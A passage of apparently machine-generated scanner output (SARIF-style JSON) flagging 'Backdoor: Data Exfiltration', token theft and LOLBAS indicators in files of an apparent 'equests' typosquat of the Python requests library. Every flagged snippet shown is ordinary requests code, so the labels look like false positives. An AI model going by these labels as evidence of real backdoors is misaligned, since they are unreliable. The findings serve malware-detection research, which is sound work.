                  "endLine": 102,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    def __getitem__(self, key):\n        # We allow fall-through here, so values default to None\n\n        return self.__dict__.get(key, None)\n\n    def get(self, key, default=None):\n        return self.__dict__.get(key, default)\n",
                    "rendered": {
                      "text": "    def __getitem__(self, key):\n        # We allow fall-through here, so values default to None\n\n        return self.__dict__.get(key, None)\n\n    def get(self, key, default=None):\n        return self.__dict__.get(key, default)\n",
                      "markdown": "`    def __getitem__(self, key):\n        # We allow fall-through here, so values default to None\n\n        return self.__dict__.get(key, None)\n\n    def get(self, key, default=None):\n        return self.__dict__.get(key, default)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/hooks.py"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 17,
                  "endLine": 26,
                  "endColumn": 22,
                  "snippet": {
                    "text": "def dispatch_hook(key, hooks, hook_data, **kwargs):\n    \"\"\"Dispatches a hook dictionary on a given piece of data.\"\"\"\n    hooks = hooks or {}\n    hooks = hooks.get(key)\n    if hooks:\n        if hasattr(hooks, '__call__'):\n            hooks = [hooks]\n",
                    "rendered": {
                      "text": "def dispatch_hook(key, hooks, hook_data, **kwargs):\n    \"\"\"Dispatches a hook dictionary on a given piece of data.\"\"\"\n    hooks = hooks or {}\n    hooks = hooks.get(key)\n    if hooks:\n        if hasattr(hooks, '__call__'):\n            hooks = [hooks]\n",
                      "markdown": "`def dispatch_hook(key, hooks, hook_data, **kwargs):\n    \"\"\"Dispatches a hook dictionary on a given piece of data.\"\"\"\n    hooks = hooks or {}\n    hooks = hooks.get(key)\n    if hooks:\n        if hasattr(hooks, '__call__'):\n            hooks = [hooks]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/help.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 10,
                  "endLine": 32,
                  "snippet": {
                    "text": "    OpenSSL = None\n    cryptography = None\nelse:\n    import OpenSSL\n    import cryptography\n\n\ndef _implementation():\n",
                    "rendered": {
                      "text": "    OpenSSL = None\n    cryptography = None\nelse:\n    import OpenSSL\n    import cryptography\n\n\ndef _implementation():\n",
                      "markdown": "`    OpenSSL = None\n    cryptography = None\nelse:\n    import OpenSSL\n    import cryptography\n\n\ndef _implementation():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/help.py"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 3,
                  "endLine": 28,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    from urllib3.contrib import pyopenssl\nexcept ImportError:\n    pyopenssl = None\n    OpenSSL = None\n    cryptography = None\nelse:\n    import OpenSSL\n",
                    "rendered": {
                      "text": "    from urllib3.contrib import pyopenssl\nexcept ImportError:\n    pyopenssl = None\n    OpenSSL = None\n    cryptography = None\nelse:\n    import OpenSSL\n",
                      "markdown": "`    from urllib3.contrib import pyopenssl\nexcept ImportError:\n    pyopenssl = None\n    OpenSSL = None\n    cryptography = None\nelse:\n    import OpenSSL\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 709,
                  "startColumn": 36,
                  "endLine": 709,
                  "endColumn": 41,
                  "snippet": {
                    "text": "            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n        proxies = merge_setting(proxies, self.proxies)\n",
                    "rendered": {
                      "text": "            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n        proxies = merge_setting(proxies, self.proxies)\n",
                      "markdown": "`            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n        proxies = merge_setting(proxies, self.proxies)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 708,
                  "startColumn": 36,
                  "endLine": 708,
                  "endColumn": 41,
                  "snippet": {
                    "text": "            # Look for requests environment configuration and be compatible\n            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n",
                    "rendered": {
                      "text": "            # Look for requests environment configuration and be compatible\n            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n",
                      "markdown": "`            # Look for requests environment configuration and be compatible\n            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 700,
                  "startColumn": 30,
                  "endLine": 700,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        # Gather clues from the surrounding environment.\n        if self.trust_env:\n            # Set environment's proxies.\n            no_proxy = proxies.get('no_proxy') if proxies is not None else None\n            env_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n            for (k, v) in env_proxies.items():\n                proxies.setdefault(k, v)\n",
                    "rendered": {
                      "text": "        # Gather clues from the surrounding environment.\n        if self.trust_env:\n            # Set environment's proxies.\n            no_proxy = proxies.get('no_proxy') if proxies is not None else None\n            env_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n            for (k, v) in env_proxies.items():\n                proxies.setdefault(k, v)\n",
                      "markdown": "`        # Gather clues from the surrounding environment.\n        if self.trust_env:\n            # Set environment's proxies.\n            no_proxy = proxies.get('no_proxy') if proxies is not None else None\n            env_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n            for (k, v) in env_proxies.items():\n                proxies.setdefault(k, v)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 635,
                  "startColumn": 23,
                  "endLine": 635,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n        # Set up variables needed for resolve_redirects and dispatching of hooks\n        allow_redirects = kwargs.pop('allow_redirects', True)\n        stream = kwargs.get('stream')\n        hooks = request.hooks\n\n        # Get the appropriate adapter to use\n",
                    "rendered": {
                      "text": "\n        # Set up variables needed for resolve_redirects and dispatching of hooks\n        allow_redirects = kwargs.pop('allow_redirects', True)\n        stream = kwargs.get('stream')\n        hooks = request.hooks\n\n        # Get the appropriate adapter to use\n",
                      "markdown": "`\n        # Set up variables needed for resolve_redirects and dispatching of hooks\n        allow_redirects = kwargs.pop('allow_redirects', True)\n        stream = kwargs.get('stream')\n        hooks = request.hooks\n\n        # Get the appropriate adapter to use\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 611,
                  "startColumn": 19,
                  "endLine": 611,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('DELETE', url, **kwargs)\n\n    def send(self, request, **kwargs):\n        \"\"\"Send a given PreparedRequest.\n",
                    "rendered": {
                      "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('DELETE', url, **kwargs)\n\n    def send(self, request, **kwargs):\n        \"\"\"Send a given PreparedRequest.\n",
                      "markdown": "`        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('DELETE', url, **kwargs)\n\n    def send(self, request, **kwargs):\n        \"\"\"Send a given PreparedRequest.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 601,
                  "startColumn": 19,
                  "endLine": 601,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('PATCH', url, data=data, **kwargs)\n\n    def delete(self, url, **kwargs):\n        r\"\"\"Sends a DELETE request. Returns :class:`Response` object.\n",
                    "rendered": {
                      "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('PATCH', url, data=data, **kwargs)\n\n    def delete(self, url, **kwargs):\n        r\"\"\"Sends a DELETE request. Returns :class:`Response` object.\n",
                      "markdown": "`        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('PATCH', url, data=data, **kwargs)\n\n    def delete(self, url, **kwargs):\n        r\"\"\"Sends a DELETE request. Returns :class:`Response` object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 589,
                  "startColumn": 19,
                  "endLine": 589,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('PUT', url, data=data, **kwargs)\n\n    def patch(self, url, data=None, **kwargs):\n        r\"\"\"Sends a PATCH request. Returns :class:`Response` object.\n",
                    "rendered": {
                      "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('PUT', url, data=data, **kwargs)\n\n    def patch(self, url, data=None, **kwargs):\n        r\"\"\"Sends a PATCH request. Returns :class:`Response` object.\n",
                      "markdown": "`        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('PUT', url, data=data, **kwargs)\n\n    def patch(self, url, data=None, **kwargs):\n        r\"\"\"Sends a PATCH request. Returns :class:`Response` object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 577,
                  "startColumn": 19,
                  "endLine": 577,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('POST', url, data=data, json=json, **kwargs)\n\n    def put(self, url, data=None, **kwargs):\n        r\"\"\"Sends a PUT request. Returns :class:`Response` object.\n",
                    "rendered": {
                      "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('POST', url, data=data, json=json, **kwargs)\n\n    def put(self, url, data=None, **kwargs):\n        r\"\"\"Sends a PUT request. Returns :class:`Response` object.\n",
                      "markdown": "`        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('POST', url, data=data, json=json, **kwargs)\n\n    def put(self, url, data=None, **kwargs):\n        r\"\"\"Sends a PUT request. Returns :class:`Response` object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 564,
                  "startColumn": 19,
                  "endLine": 564,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        \"\"\"\n\n        kwargs.setdefault('allow_redirects', False)\n        return self.request('HEAD', url, **kwargs)\n\n    def post(self, url, data=None, json=None, **kwargs):\n        r\"\"\"Sends a POST request. Returns :class:`Response` object.\n",
                    "rendered": {
                      "text": "        \"\"\"\n\n        kwargs.setdefault('allow_redirects', False)\n        return self.request('HEAD', url, **kwargs)\n\n    def post(self, url, data=None, json=None, **kwargs):\n        r\"\"\"Sends a POST request. Returns :class:`Response` object.\n",
                      "markdown": "`        \"\"\"\n\n        kwargs.setdefault('allow_redirects', False)\n        return self.request('HEAD', url, **kwargs)\n\n    def post(self, url, data=None, json=None, **kwargs):\n        r\"\"\"Sends a POST request. Returns :class:`Response` object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 553,
                  "startColumn": 19,
                  "endLine": 553,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        \"\"\"\n\n        kwargs.setdefault('allow_redirects', True)\n        return self.request('OPTIONS', url, **kwargs)\n\n    def head(self, url, **kwargs):\n        r\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n",
                    "rendered": {
                      "text": "        \"\"\"\n\n        kwargs.setdefault('allow_redirects', True)\n        return self.request('OPTIONS', url, **kwargs)\n\n    def head(self, url, **kwargs):\n        r\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n",
                      "markdown": "`        \"\"\"\n\n        kwargs.setdefault('allow_redirects', True)\n        return self.request('OPTIONS', url, **kwargs)\n\n    def head(self, url, **kwargs):\n        r\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 542,
                  "startColumn": 19,
                  "endLine": 542,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        \"\"\"\n\n        kwargs.setdefault('allow_redirects', True)\n        return self.request('GET', url, **kwargs)\n\n    def options(self, url, **kwargs):\n        r\"\"\"Sends a OPTIONS request. Returns :class:`Response` object.\n",
                    "rendered": {
                      "text": "        \"\"\"\n\n        kwargs.setdefault('allow_redirects', True)\n        return self.request('GET', url, **kwargs)\n\n    def options(self, url, **kwargs):\n        r\"\"\"Sends a OPTIONS request. Returns :class:`Response` object.\n",
                      "markdown": "`        \"\"\"\n\n        kwargs.setdefault('allow_redirects', True)\n        return self.request('GET', url, **kwargs)\n\n    def options(self, url, **kwargs):\n        r\"\"\"Sends a OPTIONS request. Returns :class:`Response` object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 339,
                  "startColumn": 15,
                  "endLine": 339,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    Or as a context manager::\n\n      >>> with requests.Session() as s:\n      ...     s.get('https://httpbin.org/get')\n      <Response [200]>\n    \"\"\"\n\n",
                    "rendered": {
                      "text": "    Or as a context manager::\n\n      >>> with requests.Session() as s:\n      ...     s.get('https://httpbin.org/get')\n      <Response [200]>\n    \"\"\"\n\n",
                      "markdown": "`    Or as a context manager::\n\n      >>> with requests.Session() as s:\n      ...     s.get('https://httpbin.org/get')\n      <Response [200]>\n    \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 333,
                  "startColumn": 11,
                  "endLine": 333,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n      >>> import requests\n      >>> s = requests.Session()\n      >>> s.get('https://httpbin.org/get')\n      <Response [200]>\n\n    Or as a context manager::\n",
                    "rendered": {
                      "text": "\n      >>> import requests\n      >>> s = requests.Session()\n      >>> s.get('https://httpbin.org/get')\n      <Response [200]>\n\n    Or as a context manager::\n",
                      "markdown": "`\n      >>> import requests\n      >>> s = requests.Session()\n      >>> s.get('https://httpbin.org/get')\n      <Response [200]>\n\n    Or as a context manager::\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 136,
                  "startColumn": 37,
                  "endLine": 136,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        # Handle default port usage corresponding to scheme.\n        changed_port = old_parsed.port != new_parsed.port\n        changed_scheme = old_parsed.scheme != new_parsed.scheme\n        default_port = (DEFAULT_PORTS.get(old_parsed.scheme, None), None)\n        if (not changed_scheme and old_parsed.port in default_port\n                and new_parsed.port in default_port):\n            return False\n",
                    "rendered": {
                      "text": "        # Handle default port usage corresponding to scheme.\n        changed_port = old_parsed.port != new_parsed.port\n        changed_scheme = old_parsed.scheme != new_parsed.scheme\n        default_port = (DEFAULT_PORTS.get(old_parsed.scheme, None), None)\n        if (not changed_scheme and old_parsed.port in default_port\n                and new_parsed.port in default_port):\n            return False\n",
                      "markdown": "`        # Handle default port usage corresponding to scheme.\n        changed_port = old_parsed.port != new_parsed.port\n        changed_scheme = old_parsed.scheme != new_parsed.scheme\n        default_port = (DEFAULT_PORTS.get(old_parsed.scheme, None), None)\n        if (not changed_scheme and old_parsed.port in default_port\n                and new_parsed.port in default_port):\n            return False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 90,
                  "startColumn": 45,
                  "endLine": 90,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    if session_hooks is None or session_hooks.get('response') == []:\n        return request_hooks\n\n    if request_hooks is None or request_hooks.get('response') == []:\n        return session_hooks\n\n    return merge_setting(request_hooks, session_hooks, dict_class)\n",
                    "rendered": {
                      "text": "    if session_hooks is None or session_hooks.get('response') == []:\n        return request_hooks\n\n    if request_hooks is None or request_hooks.get('response') == []:\n        return session_hooks\n\n    return merge_setting(request_hooks, session_hooks, dict_class)\n",
                      "markdown": "`    if session_hooks is None or session_hooks.get('response') == []:\n        return request_hooks\n\n    if request_hooks is None or request_hooks.get('response') == []:\n        return session_hooks\n\n    return merge_setting(request_hooks, session_hooks, dict_class)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 87,
                  "startColumn": 45,
                  "endLine": 87,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    This is necessary because when request_hooks == {'response': []}, the\n    merge breaks Session hooks entirely.\n    \"\"\"\n    if session_hooks is None or session_hooks.get('response') == []:\n        return request_hooks\n\n    if request_hooks is None or request_hooks.get('response') == []:\n",
                    "rendered": {
                      "text": "    This is necessary because when request_hooks == {'response': []}, the\n    merge breaks Session hooks entirely.\n    \"\"\"\n    if session_hooks is None or session_hooks.get('response') == []:\n        return request_hooks\n\n    if request_hooks is None or request_hooks.get('response') == []:\n",
                      "markdown": "`    This is necessary because when request_hooks == {'response': []}, the\n    merge breaks Session hooks entirely.\n    \"\"\"\n    if session_hooks is None or session_hooks.get('response') == []:\n        return request_hooks\n\n    if request_hooks is None or request_hooks.get('response') == []:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 297,
                  "startColumn": 71,
                  "endLine": 297,
                  "endColumn": 79,
                  "snippet": {
                    "text": "            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n\n        return new_proxies\n\n",
                    "rendered": {
                      "text": "            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n\n        return new_proxies\n\n",
                      "markdown": "`            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n\n        return new_proxies\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 296,
                  "startColumn": 24,
                  "endLine": 296,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        except KeyError:\n            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n\n        return new_proxies\n",
                    "rendered": {
                      "text": "        except KeyError:\n            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n\n        return new_proxies\n",
                      "markdown": "`        except KeyError:\n            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n\n        return new_proxies\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 294,
                  "startColumn": 22,
                  "endLine": 294,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n",
                    "rendered": {
                      "text": "        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n",
                      "markdown": "`        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 292,
                  "startColumn": 22,
